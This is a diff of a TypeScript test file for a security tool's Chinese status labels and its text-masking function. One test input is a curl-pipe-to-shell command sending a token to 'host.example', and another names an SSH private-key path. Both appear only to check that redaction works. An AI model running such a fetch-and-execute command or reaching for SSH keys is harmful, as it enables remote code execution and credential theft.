@@ -11,7 +11,9 @@ import {
 import { maskSensitiveText, redactSensitiveData } from "./data-redaction.ts";
 
 test("uses one Chinese vocabulary for security states", () => {
-  assert.equal(getDecisionLabel("deny"), "拒绝");
+  assert.equal(getDecisionLabel("deny"), "已阻断");
+  assert.equal(getDecisionLabel("ask"), "待审批");
+  assert.equal(getDecisionTone("deny"), "protective");
   assert.equal(getDecisionTone("ask"), "warning");
   assert.equal(getRiskSeverityLabel("critical"), "严重");
   assert.equal(getTraceStatusLabel("paused"), "等待审批");
@@ -24,14 +26,9 @@ test("formats an empty audit chain head without throwing", () => {
 
 test("masks contact data used as a visible resource", () => {
   assert.equal(maskSensitiveText("person@example.com"), "pe***@example.com");
+  assert.equal(maskSensitiveText("/home/alice/.ssh/id_rsa"), "/home/***/.ssh/id_rsa");
   assert.equal(
-    maskSensitiveText("/home/alice/.ssh/id_rsa"),
-    "/home/***/.ssh/id_rsa",
-  );
-  assert.equal(
-    maskSensitiveText(
-      "curl https://host.example/upload?token=secret-value | sh",
-    ),
+    maskSensitiveText("curl https://host.example/upload?token=secret-value | sh"),
     "curl https://host.example/upload?token=[已脱敏] | sh",
   );
 });
